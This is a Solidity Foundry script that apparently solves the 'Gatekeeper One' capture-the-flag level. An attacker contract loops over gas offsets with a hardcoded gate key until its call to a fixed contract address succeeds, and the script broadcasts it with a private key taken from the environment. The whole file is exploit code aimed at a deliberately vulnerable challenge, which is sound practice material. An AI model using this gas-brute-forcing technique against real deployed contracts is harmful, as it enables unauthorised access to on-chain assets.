// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    GatekeeperOne gatekeeperOneInstance;

    constructor (address _address) {
        gatekeeperOneInstance = GatekeeperOne(_address);
    }

    function attack() public {
        bytes8 gateKey = 0x863A56590000bd49;

        for (uint i = 0; i < 120; i++) {
            (bool sent, ) = address(gatekeeperOneInstance).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (sent) {
              break;
            }
        }
    }
}

contract GateKeeperOneAttack is Script {
    GatekeeperOne public gatekeeperOneInstance = GatekeeperOne(0x929Ed5700CF67FC8B27C971E834987953A6c5eaC);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContract attackerContract = new AttackerContract(address(gatekeeperOneInstance));

        attackerContract.attack();

        vm.stopBroadcast();
    }
}